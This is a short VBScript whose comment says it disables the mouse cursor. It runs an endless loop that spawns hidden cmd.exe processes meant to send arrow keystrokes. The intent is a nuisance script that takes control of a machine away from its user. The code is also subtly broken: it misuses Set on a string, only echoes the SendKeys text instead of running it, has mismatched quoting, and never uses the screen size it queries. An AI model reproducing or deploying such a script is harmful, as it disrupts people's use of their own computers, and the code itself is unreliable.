Set objShell = CreateObject("WScript.Shell")
Set objDesktop = objShell.SpecialFolders("Desktop")

' Get the screen width and height
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objDesktopMonitor = objWMIService.ExecQuery("SELECT * FROM Win32_DesktopMonitor")
For Each objMonitor in objDesktopMonitor
    intScreenWidth = objMonitor.ScreenWidth
    intScreenHeight = objMonitor.ScreenHeight
Next

' Disable the mouse cursor by continuously moving it to the same position
Do While True
    objShell.Run "cmd.exe /c C:\Windows\System32\cmd.exe /c echo CreateObject(""WScript.Shell"").SendKeys ""{UP}"": WScript.Sleep 10: CreateObject(""WScript.Shell"").SendKeys ""{LEFT}"": WScript.Sleep 10"", 0, True"
    objShell.Run "cmd.exe /c C:\Windows\System32\cmd.exe /c echo CreateObject(""WScript.Shell"").SendKeys ""{DOWN}"": WScript.Sleep 10: CreateObject(""WScript.Shell"").SendKeys ""{RIGHT}"": WScript.Sleep 10"", 0, True"
    objShell.Run "cmd.exe /c C:\Windows\System32\cmd.exe /c echo CreateObject(""WScript.Shell"").SendKeys ""{UP}"": WScript.Sleep 10: CreateObject(""WScript.Shell"").SendKeys ""{LEFT}"": WScript.Sleep 10"", 0, True"
    objShell.Run "cmd.exe /c C:\Windows\System32\cmd.exe /c echo CreateObject(""WScript.Shell"").SendKeys ""{DOWN}"": WScript.Sleep 10: CreateObject(""WScript.Shell"").SendKeys ""{RIGHT}"": WScript.Sleep 10"", 0, True"
    WScript.Sleep 100
Loop
